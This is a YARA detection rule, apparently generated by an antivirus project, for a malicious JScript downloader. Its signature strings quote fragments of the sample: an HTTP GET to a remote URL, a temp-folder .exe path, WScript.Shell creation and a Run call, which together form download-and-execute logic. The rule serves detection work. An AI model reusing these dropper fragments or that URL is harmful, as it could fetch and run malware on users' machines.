rule sig_20160328_fd37f804e10e77f1f674a1c7f47fc9da {
  meta:
    description = "datamaliciousorder - file 20160328_fd37f804e10e77f1f674a1c7f47fc9da.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6cfb9056e5da23bf8732d2d9d22f08414caf17d2e361ff30ac7d12b5de7874d5"

  strings:
    $s1  = "function Alddngv() {return Aevorfmxar[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"GObY3EDshv8V.exe\";};" fullword ascii
    $s2  = "Oxwvzt[Weynvxx](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Niihfj](Nrrxamgjah() * 11)} while (Oxwvzt[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Hzkhtuga(Mlzneep, Kxjzhdom){return Mlzneep - Kxjzhdom;};" fullword ascii
    $s5  = "var Aevorfmxar = function Cpclf() {return WScript[Lnmffbuqy](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ghedyoe(Vkjvzff){Aevorfmxar[\"Run\"](Vkjvzff, Gbneyhjy, Gbneyhjy);};" fullword ascii
    $s7  = "function Ezbfeznftm() {return ((Gvhwst == true) && (Gvhwst == Gxzudl)) ? 1 : Gbneyhjy;};" fullword ascii
    $s8  = "function Talco(){return Lrudxifqe;};" fullword ascii
    $s9  = " while (Qxmjr){" fullword ascii
    $s10 = "function Wcsrzeidww(){return Lnmffbuqy;};" fullword ascii
    $s11 = "Gxzudl = true; " fullword ascii
    $s12 = "function Oxlsq(Azrqa) {var Guacrrydvu = (1, 2, 3, 4, 5, Azrqa); return Guacrrydvu;};" fullword ascii
    $s13 = "return Hzkhtuga(Egtcgdxue, Gtpkoq);" fullword ascii
    $s14 = "Gvhwst = true; " fullword ascii
    $s15 = "var Mmniyhkj = new this[\"Date\"]();" fullword ascii
    $s16 = "var Ogwjwfeaq = false;" fullword ascii
    $s17 = "var Gxzudl = false;" fullword ascii
    $s18 = "var Gvhwst = false;" fullword ascii
    $s19 = "function Eecdxgv()" fullword ascii
    $s20 = "function Nrrxamgjah(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}